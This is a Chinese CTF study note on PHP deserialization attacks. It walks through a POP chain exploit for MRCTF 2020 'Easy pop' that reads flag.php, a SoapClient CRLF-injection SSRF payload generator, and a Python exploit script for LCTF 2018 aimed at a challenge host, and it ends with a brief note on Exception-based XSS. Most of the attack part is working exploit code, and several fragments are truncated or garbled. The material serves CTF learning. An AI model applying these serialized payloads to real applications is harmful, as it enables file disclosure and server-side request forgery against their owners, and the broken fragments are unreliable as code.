# Pop chain
**把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN
。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。**
通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性 **联系** 起来。
一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。
我的理解: POP CHAIN 更多的是在类之间,方法之间的调用上,由于方法的参数可控,存在危险函数,导致了漏洞,其实也是在代码逻辑上出现的问题
在编写Pop 链的exp的时候, 类的框架几乎不变,只需要做一些修改
例题: MRCTF 2020 Easy pop
    Welcome to index.php
    append($this->var);
        }
    }
    class Show{
        public $source;
        public $str;
        public function __construct($file='index.php'){
            $this->source = $file;
            echo 'Welcome to '.$this->source."";
        }
        public function __toString(){
            return $this->str->source;
        }
        public function __wakeup(){
            if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
                echo "hacker";
                $this->source = "index.php";
            }
        }
    }
    class Test{
        public $p;
        public function __construct(){
            $this->p = array();
        }
        public function __get($key){
            $function = $this->p;
            return $function();
        }
    }
    if(isset($_GET['pop'])){
        @unserialize($_GET['pop']);
    }
    else{
        $a=new Show;
        highlight_file(__FILE__);
    }
这里一共3个类, 故利用起来比较简单, 适合理解
在Modifier类中有`__invoke`魔术方法,该方法是当以函数的形式去调用一个对象时,触发该函数,然后就会调用`append()`函数去进行包含
在Show类中有`__toString`魔术方法,当对象被当做字符串的适合,触发该函数
在Test类中有`__get`魔术方法, 当读取一个不可访问的属性的值时触发该函数
pop 链逻辑:
  * 在类Show 中, `$this->souce` 如果是Show 类,就会调用`__toString`方法
  * `__toString`方法中 `$this->str->source` , 如果str为Test类中的属性`p`, 然后Test类中不存在`source`属性,就会调用`__get`方法
  * `__get`方法将属性`p`作为函数返回,如果属性`p` 是`Modifier`类就会调用`__invoke`方法, `__invoke`方法中就会去包含`var`,从而通过`伪协议`读取到flag.php
exp:
    source = $file;
            echo 'Welcome to ' . $this->source . "";
        }
        public function __toString()
        {
         return "php serialize";
        }
        public function __wakeup()
        {
         $this->source = new Show();
        }
    }
    class Test{
        public $p;
        public function __construct()
        {
            $this->p = new Modifier();
        }
    }
    $a = new Show('flag.php'); // 初始化参数随便
    $a->str = new Test();
    $b = new Show($a);
    $pop = serialize($b);
    echo urlencode($pop);
# SoapClient + 反序列化 => SSRF
SoapClient 类搭配CRLF注入可以实现SSRF, 在本地生成payload的时候,需要修改`php.ini` 中的 `;extension
soap` 将注释删掉即可
因为SoapClient 类会调用 `__call` 方法,当执行一个不存在的方法时,被调用,从而实现ssrf
生成payload:
     $url, 'location' => $url));
    $a = serialize($b);
    $a = str_replace('^^', "\r\n", $a);
    echo "|" . urlencode($a);
    ?>
可供练习的例题: LCTF 2018 bestphp's revenge
exp:
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    # @Author  : Eustiar
    import requests
    import re
    url = "http://c85b635f-1224-4de2-9b64-de9a2adc0d99.node3.buuoj.cn/"
    payload = '|O:10:"SoapClient":3:{s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;}'
    r = requests.session()
    data = {'serialize_handler': 'php_serialize'}
    res = r.post(url=url+'?f=session_start&name='+payload, data=data)
    # print(res.text)
    res = r.get(url)
    # print(res.text)
    data = {'b':'call_user_func'}
    res = r.post(url=url+'?f=extract', data=data)
    res = r.post(url=url+'?f=extract', data=data)  # 相当于刷新页面
    sessionid = re.findall(r'string\(26\) "(.*?)"', res.text)
    cookie = {"Cookie": "PHPSESSID=" + sessionid[0]}
    res = r.get(url, headers=cookie)
    print(res.text)
# Exception + 反序列化 => XSS
这是之前在BJD上一道题目学到点, 以前没遇到过,
php 的原生类中的`Error` 和`Exception` 中内置了`toString` 方法, 可能造成xss漏洞
当时那个题我没有用原生类,直接用的打cookie一样也能做出来
  * 
  * 
  * 